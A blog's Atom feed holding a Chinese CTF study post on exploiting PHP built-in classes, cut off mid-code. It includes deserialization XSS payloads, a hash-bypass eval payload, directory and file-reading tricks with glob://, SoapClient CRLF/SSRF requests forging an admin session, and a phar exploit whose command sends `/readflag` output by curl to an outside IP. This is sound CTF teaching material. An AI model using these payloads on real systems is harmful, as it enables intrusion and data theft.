<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sakura</title>
  
  
  <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
  
  <link href="https://sakurahack-y.github.io/"/>
  <updated>2022-11-19T17:32:14.612Z</updated>
  <id>https://sakurahack-y.github.io/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php原生类学习</title>
    <link href="https://sakurahack-y.github.io/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-20T03:27:20.000Z</published>
    <updated>2022-11-19T17:32:14.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="查看各方法内置类"><a href="#查看各方法内置类" class="headerlink" title="查看各方法内置类"></a>查看各方法内置类</h1><p> 通过这段代码查看方法的类，这里看到__toString方法对应的Error类  </p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;__destruct&#39;,            &#39;__toString&#39;,            &#39;__wakeup&#39;,            &#39;__call&#39;,            &#39;__callStatic&#39;,            &#39;__get&#39;,            &#39;__set&#39;,            &#39;__isset&#39;,            &#39;__unset&#39;,            &#39;__invoke&#39;,            &#39;__set_state&#39;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664897701461-e3b768b2-f079-4361-acd3-5955b55ff9e8.png" alt="image.png"></p><h1 id="利用Error-Exception内置类进行XSS"><a href="#利用Error-Exception内置类进行XSS" class="headerlink" title="利用Error/Exception内置类进行XSS"></a>利用Error/Exception内置类进行XSS</h1><h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p>利用条件:<br>php7以上<br>开启报错情况下<br> Error类是php的一个常见类，用于自定义一个Error，当用户输入错误的值，回显Error页面，php7版本会存在类似的XSS漏洞。Error::__toString，Error类存在__toString的方法，该方法进行类当作字符串进行回应，也就是echo $l3ife会显示什么。php对象当作一个字符串输出（echo $l3ife）会触发to_String方法。一般用于反序列化漏洞和XSS漏洞。<br> 本地创建error.php(php版本设置为7.0)  </p><pre><code class="php">&lt;?phphighlight_file(&#39;2.php&#39;);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt; </code></pre><p> 这段反序列化函数，并不存在自定义类，不可以打反序列化，可以用php反序列化的php内置类<br>poc:</p><pre><code class="php">&lt;?php    $a=new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898216896-e958dd71-080f-4d98-a8be-e70d8af6f2e2-16688788988219.png" alt="image.png"></p><h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p>利用条件:<br>php5、php7<br>开启报错的情况下</p><pre><code class="php">&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt;</code></pre><p>poc:</p><pre><code class="php">&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898394442-c162fce3-1be4-4c2f-8ad0-7e17fc82993f.png" alt="image.png"></p><h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a><strong>[BJDCTF 2nd]xss之光</strong></h2><p> 通过git拿到源码  </p><pre><code class="php">&lt;?php $a = $_GET[&#39;yds_is_so_beautiful&#39;];Echo unserialize($a);</code></pre><p> 给了GET传参，进行反序列化，不知道怎么自定义类，遇到了反序列化没有POP链的情况。只能通过php内置类进行反序列化，又存在echo，可以用__toString方法返回对象进行反序列化。该题为XSS之光，所以可以通过XSS拿出FLAG。<br> 思路：flag一般在COOKIE的信息里。<br>poc:</p><pre><code class="php">&lt;?php$poc=new    Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);Echo urlencode(serialize($poc));?&gt;反弹cookie</code></pre><p> 将得到的结果传入<br>/?yds_is_so_beautiful=$POC  </p><h1 id="利用Error-Exception-内置类绕过哈希比较"><a href="#利用Error-Exception-内置类绕过哈希比较" class="headerlink" title="利用Error/Exception 内置类绕过哈希比较"></a>利用Error/Exception 内置类绕过哈希比较</h1><p> 测试代码  :</p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);echo $a;</code></pre><p> 发现会以字符串进行输出，包括当前的错误信息payload以及报错的行号2，传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。  </p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\r\n\r\n&quot;;echo $b;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898879803-a51766b8-316d-464b-83a4-2f80e33e69a3.png" alt="image.png"><br> $a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。<br>可以利用这个方法果然哈希比较。  </p><h2 id="2020-极客大挑战-Greatphp"><a href="#2020-极客大挑战-Greatphp" class="headerlink" title="[2020 极客大挑战]Greatphp"></a><strong>[2020 极客大挑战]Greatphp</strong></h2><p> 考点：php内置绕过哈希比较、php取反绕过  </p><pre><code class="php">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#39;great&#39;]))&#123;    unserialize($_GET[&#39;great&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p> 要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。<br>主要是绕过这个</p><pre><code class="php">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))</code></pre><p> md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。<br>我们先来测试一下:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="image.png"><br>注意两个Error要在同一行哦，否则他们报错的输出有行数的不同！<br>payload:</p><pre><code class="php">&lt;?phpclass SYCLOVER &#123;    public $syc;    public $lover;&#125;//$cmd = &quot;flag.php&quot;;//$str = urlencode(~$cmd);  %99%93%9E%98%D1%8F%97%8F$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;//print $str;echo &quot;\r\n\r\n&quot;;$c = new SYCLOVER();$c-&gt;syc = new Error($str,1);$c-&gt;lover=new Error($str,2);echo urlencode(serialize($c));?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="image.png"><br>这里其实有一个地方要注意:</p><pre><code class="php">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;</code></pre><p>为什么最前面要加上?&gt;呢<br>我们还记得Error类返回什么吗?<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="image.png"><br>Error是无法直接返回我们所需要的paylaod的，它前面有Error:影响，我们可以用&gt;?去闭合它<br>最终我们的语句就变为:</p><pre><code class="php">eval(&quot;Error:?&gt;&lt;?=include &#39;flag.php&#39;?&gt;xxxxxxx&quot;)</code></pre><p>这样实际上是不影响语句的执行</p><h1 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h1><h2 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h2><pre><code class="php">版本：php5、php7、php8Filesystemlterator版本：PHP 5 &gt;= 5.3.0, PHP 7, PHP 8</code></pre><pre><code class="php">&lt;?php highlight_file(__file__); $dir=$_GET[&#39;cmd&#39;]; $a=new DirectoryIterator($dir); foreach($a as $f)&#123;     echo($f -&gt; __toString().&quot;&lt;br&gt;&quot;);      &#125; ?&gt; </code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="image.png"><br> 查看该类，发现__toString()方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="image.png"><br> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名 配合glob://协议使用模式匹配来寻找我们想要的文件路径 </p><h2 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h2><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。<br>该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="image.png"><br>遍历一下</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;foreach($dir as $tmp)&#123;    echo($tmp.&#39;&lt;br&gt;&#39;);    echo &quot;\n&quot;;&#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="image.png"></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="image.png"></p><pre><code class="php">    &lt;?php    $dir=new SplFileObject(&quot;flag.php&quot;);    echo $dir;    ?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="image.png"><br> 对文件中的每一行内容进行遍历：  </p><pre><code class="php">&lt;?php$dir = new SplFileObject(&quot;flag.php&quot;);foreach($dir as $tmp)&#123;    echo ($tmp.&#39;&lt;br&gt;&#39;);&#125;?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="image.png"><br>出题的时候如果看到形如:</p><pre><code class="php">    echo new $this-&gt;key($this-&gt;value);      $this -&gt; a = new $this-&gt;key($this-&gt;value);    echo $this-&gt;a;</code></pre><p> 只需要让**$this-&gt;key<strong>值赋为我们想用原生函数，</strong>$this-&gt;value**赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的一个文件。  </p><pre><code class="php">&lt;?phpclass HY&#123;    public $a;    public $b;&#125;$c = new HY();$c-&gt;a=&quot;SplFileObject&quot;;$c-&gt;b=&quot;flag.php&quot;;echo new $c-&gt;a($c-&gt;b);?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="image.png"></p><h1 id="突破open-basedir的限制"><a href="#突破open-basedir的限制" class="headerlink" title="突破open_basedir的限制"></a>突破open_basedir的限制</h1><p> ctfshow web74  </p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0); // 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;    $c=$_POST[&#39;c&#39;];    eval($c);    $s=ob_get_contents();    ob_end_clean();    echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__); &#125; ?&gt;?&gt;</code></pre><p>首先介绍一下ob_get_contents()和ob_end_clean这两个函数。<br>缓冲区(Buffer)就是在内存中预留指定大小的存储空间用来对I/O的数据做临时存储，这部分预留的内存空间叫缓冲区。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。<br>缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。<br>ob_get_contents:返回输出缓冲区的内容，只是得到缓冲区的内容，但不清除它。<br>ob_end_clean:清空（擦除）缓冲区并关闭输出缓冲。<br>eval执行我们的命令后，输出flag内容，但是输出要经过缓冲区，对输出数据进行缓存，通过ob_get_contents() 原来的数据赋值给了$s，然后又用ob_end_clean将缓冲区清空了，那么eval就没办法输出了（缓冲区都被清空了），所以就只有$s一个输出了。所以这里可以通过exit()或者die() （exit别名）退出，这样的话就没有ob_end_clean这个缓冲区清空操作，输出就能正常输出。<br><strong>构造payload:</strong></p><pre><code class="php">c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);?&gt;</code></pre><p>然后读取文件</p><pre><code class="php">&gt;c=include(&#39;/flagx.txt&#39;);exit();</code></pre><h1 id="利用SoapClient类进行CRLF-SSRF"><a href="#利用SoapClient类进行CRLF-SSRF" class="headerlink" title="利用SoapClient类进行CRLF+SSRF"></a>利用SoapClient类进行CRLF+SSRF</h1><p> soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。<br>类介绍：  </p><pre><code class="php">SoapClient &#123;    /* 方法 */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;</code></pre><p> 存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。  </p><pre><code class="php">函数形式：    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])第一个参数为指明是否为wsdl模式，为null则为非wsdl模式wsdl，就是一个xml格式的文档，用于描述Web Server的定义第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间</code></pre><p> 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="image.png"></p><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p> 从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p>第一个参数是用来指明是否是 wsdl 模式。<br>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="image.png"><br>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据<br>在header里User-Agent在Content-Type前面</p><pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :The user_agent option specifies string to use in User-Agent header.</code></pre><p>user_agent同样可以注入CRLF，控制Content-Type的值</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=my_session&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png" alt="image.png"><br>如上，使用SoapClient<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p><h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(我这里想复现一下，感觉code那里有问题，无法进行注册和登录操作)<br>拿到admin密码之后，需要从127.0.0.1登陆，用到SSRF，通过注入a`, {serialize object});#引发反序列化漏洞<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="ebd6f7f1404a349ee8e31f27773af628.png"><br>反序列化后的SoapClient对象去调用不存在的getcountry方法，调用__call，实现SSRF<br>控制PHPSESSID为自己的session，SSRF来进行admin登陆</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1/index.php?action=login&#39;;$post_string = &#39;username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo bin2hex($aaa);?&gt;</code></pre><p> 再使用上面的PHPSESSID访问，就是admin了  </p><h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png"><br>这里只允许本地访问，我们要进行ssrf<br>构造exp:</p><pre><code class="php">&lt;?phpclass File&#123;    public $file_name;    public $func = &quot;SoapClient&quot;;    function __construct($file_name)&#123;        $this-&gt;file_name = $file_name;    &#125;&#125;$target = &#39;http://127.0.0.1/admin.php&#39;;$post_string = &#39;admin=1&amp;cmd=curl &quot;http://108.166.201.16:888&quot;.&quot;?`/readflag`&quot;&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,);$f = [null, array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;urldecode(str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string)),&#39;uri&#39;=&gt; &quot;user&quot;)];@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt; __HALT_COMPILER();&lt;/script&gt;&#39;); //设置stub$o = new File($f);$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>详细过程可查看:<a href="https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c#">https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c?#</a> 《web刷题》</p><h1 id="利用ReflectionMethod读取User类的方法"><a href="#利用ReflectionMethod读取User类的方法" class="headerlink" title="利用ReflectionMethod读取User类的方法"></a>利用ReflectionMethod读取User类的方法</h1><h2 id="ReflectionMethod类"><a href="#ReflectionMethod类" class="headerlink" title="ReflectionMethod类"></a>ReflectionMethod类</h2><p>ReflectionMethod的类报告了方法的相关信息<br>版本：(PHP 5, PHP 7, PHP 8)</p><h3 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h3><pre><code class="php">$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回nullvar_dump($ref-&gt;inNamespace()); // 是否在命名空间中var_dump($ref-&gt;getConstants()); // 获取所有定义的常量var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回falsevar_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间var_dump($ref-&gt;getStartLine()); // 获取起始行号print_r($ref-&gt;getStaticProperties()); // 获取静态属性print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制var_dump($ref-&gt;isFinal()); // 检查类是否声明为 finalvar_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类var_dump($ref-&gt;isTrait()); // 返回了是否为一个 traitvar_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。var_dump($ref-&gt;newInstance());// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。//这个参数以 array 形式传递到类的构造函数。var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。</code></pre><pre><code>### ReflectionMethod API```php/*ReflectionMethod::__construct — ReflectionMethod 的构造函数ReflectionMethod::export — 输出一个回调方法ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例ReflectionMethod::getModifiers — 获取方法的修饰符ReflectionMethod::getPrototype — 返回方法原型 (如果存在)ReflectionMethod::invoke — InvokeReflectionMethod::invokeArgs — 带参数执行ReflectionMethod::isAbstract — 判断方法是否是抽象方法ReflectionMethod::isConstructor — 判断方法是否是构造方法ReflectionMethod::isDestructor — 判断方法是否是析构方法ReflectionMethod::isFinal — 判断方法是否定义 finalReflectionMethod::isPrivate — 判断方法是否是私有方法ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)ReflectionMethod::isPublic — 判断方法是否是公开方法ReflectionMethod::isStatic — 判断方法是否是静态方法ReflectionMethod::setAccessible — 设置方法是否访问ReflectionMethod::__toString — 返回反射方法对象的字符串表达*/ReflectionMethod extends 